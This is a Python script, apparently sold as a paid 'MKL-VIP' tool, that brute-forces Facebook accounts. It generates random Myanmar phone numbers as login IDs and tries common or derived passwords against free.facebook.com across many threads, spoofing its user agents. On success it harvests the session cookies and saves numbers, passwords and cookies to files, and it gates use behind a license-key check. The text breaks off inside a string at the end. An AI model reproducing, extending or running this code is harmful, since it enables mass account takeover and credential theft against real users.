import os
import bs4
import json
import sys
import time
import random
import re
import subprocess
import platform
import struct
import string
import uuid
import base64
import zlib
from bs4 import BeautifulSoup
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import requests
try:
    import espeak
except ImportError:
    print('\n [✓] installing espeak !...\n')
    os.system('pkg install espeak')

logo = ("""\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽\033[1;33m      ____    ____     ___  ____      _____         \033[1;34m ᯽
\033[1;34m᯽\033[1;33m     |_   \  /   _|   |_  ||_  _|    |_   _|        \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       |   \/   |       | |_/ /        | |          \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       | |\  /| |       |  __'.        | |   _      \033[1;34m ᯽
\033[1;34m᯽\033[1;91m      _| |_\/_| |_  _  _| |  \ \_  _  _| |__/ |     \033[1;34m ᯽
\033[1;34m᯽\033[1;91m     |_____||_____|(_)|____||____|(_)|________|  \033[1;35mVIP\033[1;34m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽\033[1;33m>> FACEBOOK     : https://www.facebook.com/ngeko9984\033[1;94m ᯽
\033[1;94m᯽\033[1;33m>> Developer    : Zaw Myo Aung                      \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Tool Buy     : 09797805940                       \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Region       : Madayar                           \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Status  : Myanmar Number                    \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Version : VIP                               \033[1;94m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽""")

try:
    import zawmyoaung
except ImportError:
    os.system("clear")
    print(logo)
    animation = ["[\033[1;30mZ\033[1;37m□□□□□□□□□□□□□□□□□□□□□□]","[\033[1;31mZa\033[1;37m□□□□□□□□□□□□□□□□□□□□□]", "[\033[1;32mZaw\033[1;37m□□□□□□□□□□□□□□□□□□□□]", "[\033[1;33mZaw M\033[1;37m□□□□□□□□□□□□□□□□□□]", "[\033[1;34mZaw My\033[1;37m□□□□□□□□□□□□□□□□□]", "[\033[1;35mZaw Myo\033[1;37m□□□□□□□□□□□□□□□□]", "[\033[1;36mZaw Myo A\033[1;37m□□□□□□□□□□□□□□]", "[\033[1;30mZaw Myo Au\033[1;37m□□□□□□□□□□□□□]", "[\033[1;31mZaw Myo Aun\033[1;37m□□□□□□□□□□□□]", "[\033[1;32mZaw Myo Aung\033[1;37m□□□□□□□□□□□]","[\033[1;33mZaw Myo Aung T\033[1;37m□□□□□□□□□]","[\033[1;34mZaw Myo Aung Te\033[1;37m□□□□□□□□]","[\033[1;35mZaw Myo Aung Tec\033[1;37m□□□□□□□]","[\033[1;36mZaw Myo Aung Tech\033[1;37m□□□□□□]","[\033[1;30mZaw Myo Aung Techn\033[1;37m□□□□□]","[\033[1;31mZaw Myo Aung Techno\033[1;37m□□□□]","[\033[1;32mZaw Myo Aung Technol\033[1;37m□□□]","[\033[1;33mZaw Myo Aung Technolo\033[1;37m□□]","[\033[1;34mZaw Myo Aung Technolog\033[1;37m□]","[Zaw Myo Aung Technology]"]####\033[1;35m
    for i in range(60):
       time.sleep(0.1)
       cr1=random.choice(['\033[1;30m','\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m','\033[1;37m'])
       cr2=random.choice(['\033[1;37m','\033[1;30m','\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
       cr3=random.choice(['\033[1;36m','\033[1;37m','\033[1;30m','\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m'])
       ab=random.choice(['🌍','🌍','🌍','🌎','🌎','🌎','🌏','🌏','🌏'])
       sys.stdout.write(f"\r        {cr1}[{cr2}•{cr1}] {ab} "+animation [i % len(animation)] +" ")
       sys.stdout.flush()   
       
loop=0
oks=[]
cps=[]
ugen=[]

for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['NRD90M','LMY48B','R16NW','LRX21M','PKQ1','KOT49H','LMY47I','SKQ1','NGI77B'])
    g3 = random.choice(['Lenovo TB3-710F','SM-G925W8','SM-T715Y','SM-G900W8','SM-G935F','Nexus 6','KB2001','SM-J330F','SM-G965F'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {g3} Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(11,16))}_{str(rr(4,9))}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148  Version/{str(rr(4,19))}.{str(rr(1,9))} Safari/605.1.15"
    UaMainn = random.choice([u1, u2])
    ugen.append(UaMainn)
    
def linex():
	print('\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽')
	
def main():
    os.system('clear')
    print(logo)
    print("\033[1;91m[\033[1;32m1\033[1;91m][\033[1;32mA\033[1;91m] \033[1;32m- \033[1;97mNUMBER \033[1;33m(09)")
    print("\033[1;91m[\033[1;32m2\033[1;91m][\033[1;32mB\033[1;91m] \033[1;32m- \033[1;97mNUMBER \033[1;33m(+95)")
    #print("\033[1;91m[\033[1;32m3\033[1;91m][\033[1;32mC\033[1;91m] \033[1;32m- \033[1;97m2009 To 2014")
    print("\033[1;91m[\033[1;32m0\033[1;91m][\033[1;32mX\033[1;91m] \033[1;32m- \033[1;97mEXIT ")
    linex()
    MKLm = input(f'\033[1;97m[\033[1;32m-\033[1;97m]SELECT :\033[1;32m ')
    if MKLm in ["1","A","01","a"]:
        main1()
    if MKLm in ["2","B","02","b"]:
        main2()
    if MKLm in ["3","C","03","c"]:
        main3()
    if MKLm in ["0","X","00","x"]:
        os.system('exit')

def main1():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽')
    code = input('\033[1;97m[\033[1;32m-\033[1;97m]INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')   
    print(logo)
    print("\033[1;97m[\033[1;32m-\033[1;97m]YOUR CRACK LIMIT : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] ")
    linex()
    limit=int(input("\033[1;97m[\033[1;32m-\033[1;97m]INPUT YOUR LIMIT :\033[1;32m "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=170) as Fb_crack:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]IP ADDRESS  : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]COUNTRY     : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]REGION      : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]NETWORK     : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]TOTAL ID    : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]CHOICE CODE : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m]\033[1;97 IIf No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit']
            Fb_crack.submit(MKLmm,uid,pwx,tl)

    linex()
    print(f'YOUR TOTEL LIMIT : '+tl)
    print(f'TOTEL OK ACCOUNT : {str(len(oks))}')
    print(f'TOTEL CP ACCOUNT : {str(len(cps))}')
    linex()

def main2():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽')
    code = input('\033[1;97m[\033[1;32m-\033[1;97m]INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')   
    print(logo)
    print("\033[1;97m[\033[1;32m-\033[1;97m]YOUR CRACK LIMIT : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] ")
    linex()
    limit=int(input("\033[1;97m[\033[1;32m-\033[1;97m]INPUT YOUR LIMIT :\033[1;32m "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=100) as Fb_crack:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]IP ADDRESS  : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]COUNTRY     : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]REGION      : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]NETWORK     : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]TOTAL ID    : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m]CHOICE CODE : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m]\033[1;97 IIf No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        linex()
        for love in user:
            uid = '+959'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit']
            Fb_crack.submit(MKLmm,uid,pwx,tl)

    linex()
    print(f'YOUR TOTEL LIMIT : '+tl)
    print(f'TOTEL OK ACCOUNT : {str(len(oks))}')
    print(f'TOTEL CP ACCOUNT : {str(len(cps))}')
    linex()
            
def MKLmm(uid,pwx,tl):
    global loop,oks,cps
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            cr=random.choice(['\033[1;30m','\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m','\033[1;37m'])
            ab=random.choice(['🌍','🌍','🌍','🌎','🌎','🌎','🌏','🌏','🌏'])
            abc=random.choice(['🕛','🕛','🕧','🕧','🕐','🕐','🕜','🕜','🕑','🕑','🕝','🕝','🕒','🕒','🕞','🕞','🕓','🕓','🕔','🕔','🕠','🕠','🕕','🕕','🕡','🕡','🕖','🕖','🕢','🕢','🕗','🕗','🕣','🕣','🕘','🕘','🕤','🕤','🕙','🕙','🕥','🕥','🕚','🕚','🕦','🕦'])
            sys.stdout.write(f'\r{cr}[MKL-Vip] [{ab}] [\033[1;97m%s{cr}] [{abc}] [\033[1;92mOK{cr}:-\033[1;92m%s{cr}] \r'%(loop,len(oks))),    
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            info = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            update = {
            'User-Agent': pro,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/x-www-form-urlencoded",
            'cache-control': "max-age=0",
            'dpr': "1.75",
            'viewport-width': "980",
            'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua-platform-version': "\"13.0.0\"",
            'sec-ch-ua-model': "\"SM-A127F\"",
            'sec-ch-ua-full-version-list': "\"Chromium\";v=\"128.0.6613.100\", \"Not;A=Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"128.0.6613.100\"",
            'sec-ch-prefers-color-scheme': "light",
            'upgrade-insecure-requests': "1",
            'origin': "https://m.facebook.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://m.facebook.com",
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7",
            'priority': "u=0, i"}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc', data = info, headers = update).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                cok=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki=f"MKL-Vip-Tool-Developer-Zaw-Myo-Aung={cok}"
                cid = re.findall('c_user=(.*);fr', coki)[0]
                print('\033[1;34m  >>>-----------------------------------------------➤')
                print(f'\033[1;96m[\033[1;92mMKL-OK\033[1;96m]\033[1;92m '+cid+' \033[1;96m◉\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps)
                print(f'\033[1;36mCOOKIE : \033[1;32m'+coki)         
                print('\033[1;34m  >>>-----------------------------------------------➤')
                os.system('espeak -ven-us+f4 -s170 "Ok Sir, Ok Account"')
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n '+coki+'\n\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('checkpoint=%7B%22u%22%3A(.*)%2C%22t%22%3A1', coki)[0]
                print('\033[1;91m[MKL-CP]\033[1;35m '+cid+' ◉ '+uid+' ◉ '+ps)
                os.system('espeak -a 300 "Sorry Brother Cp Account"')        
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
def menu_apikey():
  UMO="MKL-"
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "8".join(uuid)
  server = requests.get('https://github.com/zawmyoaunghk/zawmyoaunghk/blob/main/key.txt').text
  os.system("clear")
  os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
  os.system('clear')              
  print ("""\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽\033[1;33m      ____    ____     ___  ____      _____         \033[1;34m ᯽
\033[1;34m᯽\033[1;33m     |_   \  /   _|   |_  ||_  _|    |_   _|        \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       |   \/   |       | |_/ /        | |          \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       | |\  /| |       |  __'.        | |   _      \033[1;34m ᯽
\033[1;34m᯽\033[1;91m      _| |_\/_| |_  _  _| |  \ \_  _  _| |__/ |     \033[1;34m ᯽
\033[1;34m᯽\033[1;91m     |_____||_____|(_)|____||____|(_)|________|  \033[1;35mVIP\033[1;34m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽\033[1;33m>> FACEBOOK     : https://www.facebook.com/ngeko9984\033[1;94m ᯽
\033[1;94m᯽\033[1;33m>> Developer    : Zaw Myo Aung                      \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Tool Buy     : 09797805940                       \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Region       : Madayar                           \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Status  : Myanmar Number                    \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Version : VIP                               \033[1;94m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽""")
  print(f"\033[1;35;1m >>THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST<<")
  print(f"")
  print(f"\x1b[1;92m >>> Contract Admin to Buy this Tools");time.sleep (0.1) 
  print(f"\033[1;91m┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐")
  print(f"\033[1;32m >>> YOUR  KEY : "+UMO+id)
  print(f"\033[1;91m└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
  print(f"\033[1;36;1m >>> COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print('\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽')
  try:
    httpCaht = requests.get("https://github.com/zawmyoaunghk/zawmyoaunghk/blob/main/key.txt").text
    if id in httpCaht:
      print("\033[1;92m  😊 YOUR KEY APROVED 😊  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.1)
      pass
    else:
      print(f"\x1b[1;92m Sorry Bro Your Key not Aproved  ")
      print(f" Send Wave or Kpay  to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://m.me/ngeko9984?text='+UMO+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == 'main':
     print(logo)
     menu_apikey()
menu_apikey()
os.system(" clear")
animation = ["\033[1;35m\n                   .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;93m ____    ____ \033[1;35m| |\n                  \033[1;35m| |\033[1;93m|_   \  /   _|\033[1;35m| |\n                  \033[1;35m| |\033[1;93m  |   \/   |  \033[1;35m| |\n                  \033[1;35m| |\033[1;93m  | |\  /| |  \033[1;35m| |\n                  \033[1;35m| |\033[1;93m _| |_\/_| |_ \033[1;35m| |\n                  \033[1;35m| |\033[1;93m|_____||_____|\033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n                  \033[1;35m .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;32m  ___  ____   \033[1;35m| |\n                  \033[1;35m| |\033[1;32m |_  ||_  _|  \033[1;35m| |\n                  \033[1;35m| |\033[1;32m   | |_/ /    \033[1;35m| |\n                  \033[1;35m| |\033[1;32m   |  __'.    \033[1;35m| |\n                  \033[1;35m| |\033[1;32m  _| |  \ \_  \033[1;35m| |\n                  \033[1;35m| |\033[1;32m |____||____| \033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n                  \033[1;35m .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;91m   _____      \033[1;35m| |\n                  \033[1;35m| |\033[1;91m  |_   _|     \033[1;35m| |\n                  \033[1;35m| |\033[1;91m    | |       \033[1;35m| |\n                  \033[1;35m| |\033[1;91m    | |   _   \033[1;35m| |\n                  \033[1;35m| |\033[1;91m   _| |__/ |  \033[1;35m| |\n                  \033[1;35m| |\033[1;91m  |________|  \033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n                       😊😊😊😊😊"]
for i in range(4):
        time.sleep(1)
        sys.stdout.write(f"\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
os.system(" clear")
print(' \033[1;32m  MKL-VIP Tool Is Login\033[1;33m....')

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; MKL-VIP \x07')

logo = ("""\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽\033[1;33m      ____    ____     ___  ____      _____         \033[1;34m ᯽
\033[1;34m᯽\033[1;33m     |_   \  /   _|   |_  ||_  _|    |_   _|        \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       |   \/   |       | |_/ /        | |          \033[1;34m ᯽
\033[1;34m᯽\033[1;32m       | |\  /| |       |  __'.        | |   _      \033[1;34m ᯽
\033[1;34m᯽\033[1;91m      _| |_\/_| |_  _  _| |  \ \_  _  _| |__/ |     \033[1;34m ᯽
\033[1;34m᯽\033[1;91m     |_____||_____|(_)|____||____|(_)|________|  \033[1;35mVIP\033[1;34m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽\033[1;33m>> FACEBOOK     : https://www.facebook.com/ngeko9984\033[1;94m ᯽
\033[1;94m᯽\033[1;33m>> Developer    : Zaw Myo Aung                      \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Tool Buy     : 09797805940                       \033[1;94m ᯽
\033[1;94m᯽\033[1;32m>> Region       : Madayar                           \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Status  : Myanmar Number                    \033[1;94m ᯽
\033[1;94m᯽\033[1;31m>> Tool Version : VIP                               \033[1;94m ᯽
\033[1;34m᯽                                                   \033[1;34m  ᯽
\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽""")
os.system('clear')
print(logo)
CorrectUsername = 'mkl'
key = 'true'
while key == 'true':
    username = input('\n\033[0;96m[᯽]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print(f'\n\033[1;94m᯽⊱•⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱┈──╌⊰᯽⊱•⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱•⊰᯽\n\n\033[0;96m[•]\033[1;32m LOGGED IN MKL-Vip TOOL SUCCESSFULLY') 
            time.sleep(1)
            os.system('clear')
            key = 'false'
            
if __name__ == "__main__":
    animation = ["\033[1;35m\n                   .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;93m ____    ____ \033[1;35m| |\n                  \033[1;35m| |\033[1;93m|_   \  /   _|\033[1;35m| |\n                  \033[1;35m| |\033[1;93m  |   \/   |  \033[1;35m| |\n                  \033[1;35m| |\033[1;93m  | |\  /| |  \033[1;35m| |\n                  \033[1;35m| |\033[1;93m _| |_\/_| |_ \033[1;35m| |\n                  \033[1;35m| |\033[1;93m|_____||_____|\033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n                  \033[1;35m .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;32m  ___  ____   \033[1;35m| |\n                  \033[1;35m| |\033[1;32m |_  ||_  _|  \033[1;35m| |\n                  \033[1;35m| |\033[1;32m   | |_/ /    \033[1;35m| |\n                  \033[1;35m| |\033[1;32m   |  __'.    \033[1;35m| |\n                  \033[1;35m| |\033[1;32m  _| |  \ \_  \033[1;35m| |\n                  \033[1;35m| |\033[1;32m |____||____| \033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n                  \033[1;35m .----------------. \n                  \033[1;35m| .--------------. |\n                  \033[1;35m| |\033[1;91m   _____      \033[1;35m| |\n                  \033[1;35m| |\033[1;91m  |_   _|     \033[1;35m| |\n                  \033[1;35m| |\033[1;91m    | |       \033[1;35m| |\n                  \033[1;35m| |\033[1;91m    | |   _   \033[1;35m| |\n                  \033[1;35m| |\033[1;91m   _| |__/ |  \033[1;35m| |\n                  \033[1;35m| |\033[1;91m  |________|  \033[1;35m| |\n                  \033[1;35m| |              | |\n                  \033[1;35m| '--------------' |\n                  \033[1;35m '----------------' ","\n         \033[1;34m᯽⊰❊⊱╌─╌⊰᯽⊱•⊰᯽⊱╌──╌⊰❊❊⊱╌──╌⊰᯽⊱•⊰᯽⊱╌─╌⊰❊⊱᯽\n         \033[1;34m᯽ \033[1;33m _______  _____  _____  ____  _____  \033[1;34m᯽\n         \033[1;34m᯽ \033[1;33m|_   __ \|_   _||_   _||_   \|_   _| \033[1;34m᯽\n         \033[1;34m᯽ \033[1;32m  | |__) | | |    | |    |   \ | |   \033[1;34m᯽\n         \033[1;34m᯽ \033[1;32m  |  __ /  | '    ' |    | |\ \| |   \033[1;34m᯽\n         \033[1;34m᯽ \033[1;91m _| |  \ \_ \ \__/ /    _| |_\   |_  \033[1;34m᯽\n         \033[1;34m᯽ \033[1;91m|____| |___| `.__.'    |_____|\____| \033[1;34m᯽\n         